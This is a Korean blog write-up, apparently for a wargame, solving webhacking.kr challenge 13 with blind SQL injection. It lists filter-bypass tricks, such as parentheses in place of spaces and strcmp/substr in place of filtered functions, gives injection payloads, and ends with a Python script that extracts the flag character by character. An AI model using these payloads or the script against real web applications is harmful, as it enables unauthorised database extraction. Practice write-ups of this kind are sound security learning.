---
title: "webhacking.kr 13번 문제 풀이"
excerpt_separator: "<!--more-->"
categories:
  - webhacking
tags:
  - webhacking
  - wargame
classes: wide
---

[13번 바로가기](http://webhacking.kr/challenge/web/web-10/?no=)

13번 문제에 접속하면 아래와 같은 화면이 나온다. SQLi관련 문제라고 알려주고 있다.

![13번_1](/img/13번_1.JPG)

입력폼이 2개 있는데 하나는 GET 인자 no에 밑에 있는건 password에 대응된다. no에 SQLi을 해서 flag를 얻고
password에 넣고 인증하면 된다. hint에 친절하게 테이블명과 컬럼명이 나와있다.


no에 1이나 `True`를 입력하면 result에 1이 나오고, 0이나 `False`를 입력하면 0이 나온다. 이걸로 blind SQLi를 할 수 있다.

![13번_2](/img/13번_2.JPG)
![13번_3](/img/13번_3.JPG)

`if(True,1,0)`을 입력하면 정상적으로 result에 1이 나온다. 공백문자, `union`, `ascii()`, `like`, `=`는 필터링되고 소괄호 `select`, `from`, `substr`, `in`, `strcmp()` 은 필터링되지 않는다.
괄호를 사용해 공백문자 필터링을 우회할 수 있다. 예를 들어 `SELECT * FROM talbe`과 `SELECT(*)FROM(talbe)`은 같은 동작을 한다.


먼저 flag가 몇개 있는지 확인해야 한다. 보통 admin등 특정 id의 password를 찾을 때는 password가 몇개인지 확인할 필요가 없지만, 이런식으로 딸랑 flag만 찾는 문제는 개수를 확인해야 한다.
`if((select(count(flag))from(prob13password))in(2),1,0)` 이런식으로 입력하면 테이블에 flag가 몇개 있는지 확인할 수 있다. `count()`는 row의 개수를 리턴해주는 함수이다.
테이블에 flag는 총 2개가 존재한다. `limit`가 필터링되기 때문에 다른 방법을 사용해서 flag를 골라야 하는데, `max`, `min` 등을 사용할 수 있다.


`if((select(max(length(flag)))from(prob13password))in(20),1,2)`


`if((select(min(length(flag)))from(prob13password))in(4),1,2)`

이렇게 하면 각각 긴 flag의 길이(20)와 작은 flag의 길이(4)를 알 수 있다.


`substr()`, `strcmp()`, `in`을 사용해 아래와 같은 쿼리를 만들어 flag를 1글자씩 알아낼 수 있다.
`if(strcmp(substr((select(max(flag))from(prob13password)),1,1),0x66),0,1)`
`if(strcmp(substr((select(min(flag))from(prob13password)),1,1),0x63),0,1)`


여기서 주의할 것은 `max(length(flag))`는 길이가 긴 flag가 나오지만 `max(flag)`는 길이가 긴 flag가 아니라, 사전순으로 뒤에 있는 flag라는 것이다.
`max(flag)`, `min(flag)` 둘 다 해서 2개의 flag를 모두 구하고 둘 중 하나(길이가 긴 것)를 auth에 입력하면 문제가 풀린다.


![13번_4](/img/13번_4.JPG)

```python
import urllib.request
import re

header = {'Cookie':'PHPSESSID=세션쿠키값'}
code = [x for x in range(32, 127)]

for i in range(1, 21):
    for c in code:
        req = urllib.request.Request("http://webhacking.kr/challenge/web/web-10/?no=if(strcmp(substr((select(min(flag))from(prob13password))," + str(i) + ",1)," + hex(c) + "),0,1)" , headers=header)
        data = urllib.request.urlopen(req).read()
        data = data.decode('UTF-8')
        find = re.findall('result</td></tr><tr><td>1</td>', data)
        if find:
            print(str(i) + ' ' + chr(c))
            break
```
